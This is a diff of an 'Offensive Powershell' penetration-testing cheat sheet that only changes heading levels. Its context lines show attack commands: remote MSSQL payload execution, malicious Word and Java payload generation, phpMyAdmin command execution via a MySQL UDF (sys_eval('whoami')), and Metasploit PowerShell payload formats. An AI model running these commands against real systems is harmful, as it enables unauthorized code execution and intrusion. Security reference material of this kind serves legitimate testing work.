@@ -1,6 +1,6 @@
 # Offensive Powershell
 ---
-# Navigation
+## Navigation
 - **[Reconnaissance](#reconnaissance)**
 	- [PortScanning Host discovery](#portscanning-host-discovery)
 	- [Directory discovery](#directory-discovery)
@@ -16,7 +16,7 @@
 > **Note:**
 >  To list the modules and parameters for a specific function in a module -> [List module commands](Powershell%2520Basics%2523List%2520module%2520commands)
 ---
-# Reconnaissance
+## Reconnaissance
 ## PortScanning & Host discovery
 ```Powershell
 #Powersploit module
@@ -64,7 +64,7 @@ Execute-Commnand-MSSQL -ComputerName abuqasemPC -payload <Command>
 ```
 > `WindowsAuthentication` is useful when our current powershell session have enough privileges to access remote DB but we don't have credentials.
 ---
-# Client-Side attacks
+## Client-Side attacks
 ## Malicious Attachments
 1. **Microsoft-Word & Excel**
 ```powershell
@@ -95,7 +95,7 @@ Out-Java -Payload "-c <COMMAND>" -JDKPAth <PATH\TO/JDK> -NoSelfSign
 > Both Scripts generate two files.
 
 ---
-# Exploitation
+## Exploitation
 ## PHPMyAdmin
 - **Assumptions**
     - Username / Password of phpMyAdmin is known
@@ -141,7 +141,7 @@ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'
 Select sys_eval('whoami')
 ```
 ---
-# Metasploit
+## Metasploit
 PowerShell payload formats
 1. **psh**
 2. **psh-cmd**
